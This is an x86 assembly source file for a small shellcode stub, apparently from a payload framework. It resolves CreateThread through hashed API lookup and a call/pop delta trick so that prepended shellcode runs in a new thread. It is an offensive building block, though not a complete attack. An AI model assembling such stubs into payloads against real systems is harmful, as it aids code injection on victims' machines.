;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (14 July 2010)
; Size: 167
; Build: >build.py createthread
;-----------------------------------------------------------------------------;

[BITS 32]
[ORG 0]

  cld
  call start
delta:
%include "./src/block/block_api.asm"
start:
  pop ebp ; pop off the address of 'api_call' for calling later.
  xor eax, eax
  push eax
  push eax
  push eax
  lea ebx, [ebp+threadstart-delta]
  push ebx
  push eax
  push eax
  push 0x160D6838 ; hash( "kernel32.dll", "CreateThread" )
  call ebp ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
  ret
threadstart:
  pop eax ; pop off the unused thread param so the prepended shellcode can just return when done.